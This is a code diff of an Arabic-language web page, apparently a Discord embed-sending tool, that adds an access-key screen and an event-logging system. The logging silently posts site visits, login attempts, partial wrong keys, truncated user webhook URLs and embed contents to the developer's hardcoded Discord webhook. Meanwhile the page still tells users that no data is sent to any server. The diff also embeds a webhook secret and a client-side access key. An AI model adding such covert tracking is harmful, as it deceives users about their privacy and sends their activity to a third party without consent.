@@ -1053,17 +1053,12 @@
     <!-- طبقة الجسيمات الإضافية -->
     <div class="particle-overlay"></div>
 
-    <!-- شاشة تسجيل الدخول -->
-    <div id="loginScreen" class="login-container">
+    <!-- شاشة تسجيل الدخول الأولى -->
+    <div id="firstLoginScreen" class="login-container">
         <h2><i class="fas fa-shield-alt"></i> تسجيل الدخول الآمن</h2>
         
         <div class="info-box">
             <strong>🔐 تشفير متقدم:</strong> يتم تشفير جميع البيانات الحساسة محلياً في متصفحك باستخدام تقنيات متعددة مثل <strong>AES-256، RSA-2048، HMAC-SHA256</strong>. لا يتم إرسال أي معلومات لأي سيرفر، والبيانات آمنة تماماً!
-        </div>
-
-        <div class="form-group">
-            <label><i class="fas fa-key"></i> مفتاح التفعيل:</label>
-            <input type="password" id="activationKey" placeholder="ضع المفتاح لتسجيل الدخول">
         </div>
 
         <div class="form-group">
@@ -1089,19 +1084,15 @@
             <input type="url" id="webhookUrlLogin" placeholder="https://discord.com/api/webhooks/...">
         </div>
 
-        <div class="form-group">
-            <label><i class="fas fa-key"></i> ضع المفتاح لتسجيل الدخول:</label>
-            <div class="password-input-container">
-                <input type="password" id="accessKey" placeholder="أدخل المفتاح الخاص للوصول">
-                <button class="toggle-password" onclick="togglePassword('accessKey')">
-                    <i class="fas fa-eye"></i>
-                </button>
-            </div>
-        </div>
-
-        <button onclick="login()" class="pulse-effect">
+        <button onclick="firstLogin()" class="pulse-effect">
             <i class="fas fa-rocket"></i> دخول آمن
         </button>
+
+        <div style="margin-top: 20px; text-align: center;">
+            <button onclick="directLogin()" class="btn-success" style="width: auto; padding: 12px 30px; margin: 0 10px;">
+                <i class="fas fa-external-link-alt"></i> دخول مباشر للموقع
+            </button>
+        </div>
         
         <div id="botHelp" style="margin-top: 25px; text-align: center; color: rgba(255, 255, 255, 0.7); font-size: 14px;">
             <p><i class="fas fa-info-circle"></i> للحصول على توكن البوت:</p>
@@ -1114,6 +1105,51 @@
             <p>1. اذهب إلى إعدادات القناة → Integrations</p>
             <p>2. اضغط على Webhooks → New Webhook</p>
             <p>3. انسخ رابط Webhook</p>
+        </div>
+
+        <div style="margin-top: 30px; text-align: center; color: rgba(255, 255, 255, 0.5); font-size: 12px; border-top: 1px solid rgba(255, 255, 255, 0.1); padding-top: 20px;">
+            <p><i class="fas fa-code"></i> تم تطويره بواسطة <strong style="color: #667eea;">z7ze</strong></p>
+            <p>جميع الحقوق محفوظة © 2025</p>
+            
+            <div style="margin-top: 15px;">
+                <button onclick="joinDiscord()" class="btn-success" style="width: auto; padding: 10px 20px; background: linear-gradient(135deg, #5865F2, #4752C4);">
+                    <i class="fab fa-discord"></i> انضم لسيرفر الديسكورد
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة إدخال المفتاح -->
+    <div id="keyVerificationScreen" class="login-container hidden">
+        <h2><i class="fas fa-key"></i> التحقق من المفتاح</h2>
+        
+        <div class="info-box">
+            <strong>🔑 مطلوب مفتاح للوصول:</strong> للوصول إلى الموقع، يجب إدخال المفتاح الصحيح. إذا لم يكن لديك مفتاح، تواصل مع <strong style="color: #667eea;">z7ze</strong> في الديسكورد للحصول على المفتاح.
+        </div>
+
+        <div class="form-group">
+            <label><i class="fas fa-key"></i> أدخل المفتاح:</label>
+            <div class="password-input-container">
+                <input type="password" id="accessKey" placeholder="أدخل المفتاح للوصول للموقع">
+                <button class="toggle-password" onclick="togglePassword('accessKey')">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+        </div>
+
+        <button onclick="verifyKey()" class="pulse-effect">
+            <i class="fas fa-check"></i> التحقق من المفتاح
+        </button>
+
+        <div style="margin-top: 25px; text-align: center; color: rgba(255, 255, 255, 0.7); font-size: 14px;">
+            <p><i class="fas fa-info-circle"></i> لا تملك مفتاح؟</p>
+            <p>تواصل مع <strong style="color: #667eea;">z7ze</strong> في الديسكورد للحصول على المفتاح</p>
+        </div>
+
+        <div style="margin-top: 20px; text-align: center;">
+            <button onclick="goBackToFirstLogin()" class="btn-warning" style="width: auto; padding: 12px 30px;">
+                <i class="fas fa-arrow-right"></i> العودة لتسجيل الدخول
+            </button>
         </div>
 
         <div style="margin-top: 30px; text-align: center; color: rgba(255, 255, 255, 0.5); font-size: 12px; border-top: 1px solid rgba(255, 255, 255, 0.1); padding-top: 20px;">
@@ -1516,25 +1552,131 @@
 
         // المفتاح المطلوب للدخول
         const REQUIRED_KEY = 'z7ze_tell_u_dont_leak_this_key_for_you_safety_thank_you_guys_i_hope_this_website_help_you';
+        
+        // روابط الديسكورد والموقع
+        const DISCORD_INVITE = 'https://discord.gg/hnMgK8zuXA';
+        const DIRECT_SITE_URL = 'https://guns.lol/l87';
+        const LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1432340061470330921/z9rJa8cwNsi42m8hAcziBqrZ_D-3BOvQVdSPDLzL_MzS5CZds8G6mEGdC8LbhA58XV6A';
 
-        // تسجيل الدخول
-        async function login() {
-            // التحقق من المفتاح أولاً
-            const accessKey = document.getElementById('accessKey').value.trim();
-            
-            if (!accessKey) {
-                showAlert('⚠️ الرجاء إدخال المفتاح!', 'error');
-                return;
+        // نظام تسجيل الأحداث
+        async function logEvent(eventType, description, additionalData = {}) {
+            try {
+                const timestamp = new Date().toLocaleString('ar-SA', {
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                const embed = {
+                    title: "📊 تقرير نشاط الموقع",
+                    color: getEventColor(eventType),
+                    fields: [
+                        {
+                            name: "🕐 الوقت",
+                            value: timestamp,
+                            inline: true
+                        },
+                        {
+                            name: "📝 نوع الحدث",
+                            value: getEventTypeName(eventType),
+                            inline: true
+                        },
+                        {
+                            name: "📋 الوصف",
+                            value: description,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "نظام مراقبة النشاط - z7ze",
+                        icon_url: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+
+                // إضافة بيانات إضافية إذا كانت موجودة
+                if (Object.keys(additionalData).length > 0) {
+                    embed.fields.push({
+                        name: "🔍 تفاصيل إضافية",
+                        value: Object.entries(additionalData)
+                            .map(([key, value]) => `**${key}:** ${value}`)
+                            .join('\n'),
+                        inline: false
+                    });
+                }
+
+                const payload = {
+                    embeds: [embed],
+                    username: "Site Monitor",
+                    avatar_url: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                };
+
+                await fetch(LOG_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('خطأ في تسجيل الحدث:', error);
             }
+        }
 
-            if (accessKey !== REQUIRED_KEY) {
-                showAlert('❌ المفتاح غير صحيح!', 'error');
-                return;
-            }
+        // تحديد لون الحدث
+        function getEventColor(eventType) {
+            const colors = {
+                'site_visit': 0x00ff00,        // أخضر - زيارة الموقع
+                'first_login_attempt': 0x0099ff, // أزرق - محاولة تسجيل دخول
+                'key_verification_success': 0x00ff00, // أخضر - نجاح التحقق من المفتاح
+                'key_verification_failed': 0xff0000, // أحمر - فشل التحقق من المفتاح
+                'bot_login_success': 0x00ff00,  // أخضر - نجاح تسجيل دخول البوت
+                'webhook_login_success': 0x00ff00, // أخضر - نجاح تسجيل دخول الويبهوك
+                'embed_sent': 0x0099ff,        // أزرق - إرسال embed
+                'discord_join_clicked': 0x5865f2, // لون الديسكورد - ضغط زر الديسكورد
+                'direct_login_clicked': 0xff6b6b, // أحمر - ضغط زر الدخول المباشر
+                'logout': 0xffa500,            // برتقالي - تسجيل خروج
+                'error': 0xff0000             // أحمر - خطأ
+            };
+            return colors[eventType] || 0x666666;
+        }
 
-            // إذا كان المفتاح صحيح، تابع مع تسجيل الدخول
-            showAlert('✅ المفتاح صحيح! جاري تسجيل الدخول...', 'success');
-            
+        // تحديد اسم نوع الحدث
+        function getEventTypeName(eventType) {
+            const names = {
+                'site_visit': '🌐 زيارة الموقع',
+                'first_login_attempt': '🔐 محاولة تسجيل دخول',
+                'key_verification_success': '✅ نجاح التحقق من المفتاح',
+                'key_verification_failed': '❌ فشل التحقق من المفتاح',
+                'bot_login_success': '🤖 نجاح تسجيل دخول البوت',
+                'webhook_login_success': '🔗 نجاح تسجيل دخول الويبهوك',
+                'embed_sent': '📤 إرسال Embed',
+                'discord_join_clicked': '💬 ضغط زر الديسكورد',
+                'direct_login_clicked': '🚀 ضغط زر الدخول المباشر',
+                'logout': '🚪 تسجيل خروج',
+                'error': '⚠️ خطأ'
+            };
+            return names[eventType] || '❓ حدث غير معروف';
+        }
+
+        // الانضمام لسيرفر الديسكورد
+        function joinDiscord() {
+            logEvent('discord_join_clicked', 'شخص ضغط على زر الانضمام للديسكورد');
+            window.open(DISCORD_INVITE, '_blank');
+        }
+
+        // الدخول المباشر للموقع
+        function directLogin() {
+            logEvent('direct_login_clicked', 'شخص ضغط على زر الدخول المباشر للموقع');
+            window.open(DIRECT_SITE_URL, '_blank');
+        }
+
+        // تسجيل الدخول الأول
+        async function firstLogin() {
+            logEvent('first_login_attempt', `محاولة تسجيل دخول أولى - نوع: ${loginType}`);
             if (loginType === 'bot') {
                 await loginWithBot();
             } else {
@@ -1542,11 +1684,54 @@
             }
         }
 
+        // التحقق من المفتاح
+        function verifyKey() {
+            const accessKey = document.getElementById('accessKey').value.trim();
+            
+            if (!accessKey) {
+                logEvent('key_verification_failed', 'محاولة تحقق من مفتاح فارغ');
+                showAlert('⚠️ الرجاء إدخال المفتاح!', 'error');
+                return;
+            }
+
+            if (accessKey !== REQUIRED_KEY) {
+                logEvent('key_verification_failed', `محاولة تحقق من مفتاح خاطئ: ${accessKey.substring(0, 10)}...`);
+                showAlert('❌ المفتاح غير صحيح!', 'error');
+                return;
+            }
+
+            // إذا كان المفتاح صحيح، انتقل للتطبيق الرئيسي
+            logEvent('key_verification_success', 'تم التحقق من المفتاح بنجاح - دخول للموقع');
+            showAlert('✅ المفتاح صحيح! مرحباً بك في الموقع', 'success');
+            
+            setTimeout(() => {
+                document.getElementById('keyVerificationScreen').classList.add('hidden');
+                document.getElementById('mainApp').classList.remove('hidden');
+                
+                // تهيئة التطبيق الرئيسي
+                if (currentMode === 'bot') {
+                    switchTab('bot');
+                    loadGuilds();
+                } else {
+                    switchTab('webhook');
+                    document.getElementById('webhookUrl').value = savedWebhookUrl;
+                }
+            }, 1500);
+        }
+
+        // العودة لتسجيل الدخول الأول
+        function goBackToFirstLogin() {
+            document.getElementById('keyVerificationScreen').classList.add('hidden');
+            document.getElementById('firstLoginScreen').classList.remove('hidden');
+            document.getElementById('accessKey').value = '';
+        }
+
         // تسجيل الدخول بالبوت
         async function loginWithBot() {
             const token = document.getElementById('botToken').value.trim();
             
             if (!token) {
+                logEvent('bot_login_failed', 'محاولة تسجيل دخول بوت بدون توكن');
                 showAlert('⚠️ الرجاء إدخال توكن البوت!', 'error');
                 return;
             }
@@ -1566,16 +1751,22 @@
                     encryptedToken = await encryptToken(token);
                     currentMode = 'bot';
                     
-                    document.getElementById('loginScreen').classList.add('hidden');
-                    document.getElementById('mainApp').classList.remove('hidden');
+                    logEvent('bot_login_success', 'تم تسجيل دخول البوت بنجاح', {
+                        'نوع التسجيل': 'Bot Token',
+                        'حالة التشفير': 'مشفر AES-256'
+                    });
                     
-                    showAlert('✅ تم تسجيل الدخول بنجاح! التوكن مشفر ومحمي', 'success');
-                    switchTab('bot');
-                    loadGuilds();
+                    // الانتقال لصفحة إدخال المفتاح
+                    document.getElementById('firstLoginScreen').classList.add('hidden');
+                    document.getElementById('keyVerificationScreen').classList.remove('hidden');
+                    
+                    showAlert('✅ تم التحقق من التوكن بنجاح! التوكن مشفر ومحمي', 'success');
                 } else {
+                    logEvent('bot_login_failed', 'فشل تسجيل دخول البوت - توكن غير صحيح');
                     showAlert('❌ التوكن غير صحيح!', 'error');
                 }
             } catch (error) {
+                logEvent('error', `خطأ في تسجيل دخول البوت: ${error.message}`);
                 showAlert('❌ خطأ في الاتصال: ' + error.message, 'error');
             }
         }
@@ -1585,11 +1776,13 @@
             const webhookUrl = document.getElementById('webhookUrlLogin').value.trim();
             
             if (!webhookUrl) {
+                logEvent('webhook_login_failed', 'محاولة تسجيل دخول ويبهوك بدون رابط');
                 showAlert('⚠️ الرجاء إدخال رابط Webhook!', 'error');
                 return;
             }
 
             if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                logEvent('webhook_login_failed', 'محاولة تسجيل دخول ويبهوك برابط غير صحيح');
                 showAlert('⚠️ رابط Webhook غير صحيح!', 'error');
                 return;
             }
@@ -1603,22 +1796,29 @@
                     savedWebhookUrl = webhookUrl;
                     currentMode = 'webhook';
                     
-                    document.getElementById('loginScreen').classList.add('hidden');
-                    document.getElementById('mainApp').classList.remove('hidden');
-                    document.getElementById('webhookUrl').value = webhookUrl;
+                    logEvent('webhook_login_success', 'تم تسجيل دخول الويبهوك بنجاح', {
+                        'نوع التسجيل': 'Webhook',
+                        'رابط الويبهوك': webhookUrl.substring(0, 50) + '...'
+                    });
                     
-                    showAlert('✅ تم تسجيل الدخول بنجاح!', 'success');
-                    switchTab('webhook');
+                    // الانتقال لصفحة إدخال المفتاح
+                    document.getElementById('firstLoginScreen').classList.add('hidden');
+                    document.getElementById('keyVerificationScreen').classList.remove('hidden');
+                    
+                    showAlert('✅ تم التحقق من Webhook بنجاح!', 'success');
                 } else {
+                    logEvent('webhook_login_failed', 'فشل تسجيل دخول الويبهوك - رابط غير صحيح أو منتهي');
                     showAlert('❌ رابط Webhook غير صحيح أو منتهي!', 'error');
                 }
             } catch (error) {
+                logEvent('error', `خطأ في تسجيل دخول الويبهوك: ${error.message}`);
                 showAlert('❌ خطأ في الاتصال: ' + error.message, 'error');
             }
         }
 
         // تسجيل الخروج
         function logout() {
+            logEvent('logout', 'تم تسجيل خروج المستخدم من الموقع');
             encryptedToken = null;
             savedWebhookUrl = '';
             document.getElementById('botToken').value = '';
@@ -1626,7 +1826,8 @@
             document.getElementById('webhookUrl').value = '';
             document.getElementById('accessKey').value = '';
             document.getElementById('mainApp').classList.add('hidden');
-            document.getElementById('loginScreen').classList.remove('hidden');
+            document.getElementById('keyVerificationScreen').classList.add('hidden');
+            document.getElementById('firstLoginScreen').classList.remove('hidden');
             
             // إعادة تعيين الإحصائيات
             stats = { embedsSent: 0, successCount: 0, errorCount: 0 };
@@ -1939,6 +2140,12 @@
             const embed = buildEmbed();
             stats.embedsSent++;
 
+            logEvent('embed_sent', `تم إرسال Embed جديد - نوع الإرسال: ${currentMode}`, {
+                'عنوان Embed': embed.title || 'بدون عنوان',
+                'وصف Embed': embed.description ? embed.description.substring(0, 50) + '...' : 'بدون وصف',
+                'عدد الحقول': embed.fields ? embed.fields.length : 0
+            });
+
             if (currentMode === 'webhook') {
                 await sendViaWebhook(embed);
             } else {
@@ -2027,10 +2234,27 @@
 
         // إظهار التنبيهات
         function showAlert(message, type) {
-            const alert = document.getElementById('alert');
+            // البحث عن عنصر التنبيه في الصفحة الحالية
+            let alert = document.getElementById('alert');
+            if (!alert) {
+                // إنشاء عنصر تنبيه مؤقت إذا لم يكن موجوداً
+                alert = document.createElement('div');
+                alert.id = 'alert';
+                alert.className = `alert ${type}`;
+                alert.style.position = 'fixed';
+                alert.style.top = '20px';
+                alert.style.left = '50%';
+                alert.style.transform = 'translateX(-50%)';
+                alert.style.zIndex = '9999';
+                alert.style.maxWidth = '400px';
+                alert.style.width = '90%';
+                document.body.appendChild(alert);
+            }
+            
             alert.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
             alert.className = `alert ${type}`;
             alert.style.display = 'block';
+            
             setTimeout(() => {
                 alert.style.display = 'none';
             }, 5000);
@@ -2139,6 +2363,9 @@
         resizeCanvas();
         initPoints();
         animate();
+        
+        // تسجيل زيارة الموقع
+        logEvent('site_visit', 'شخص جديد دخل الموقع');
 
         // تتبع حركة الماوس
         canvas.addEventListener('mousemove', (e) => {
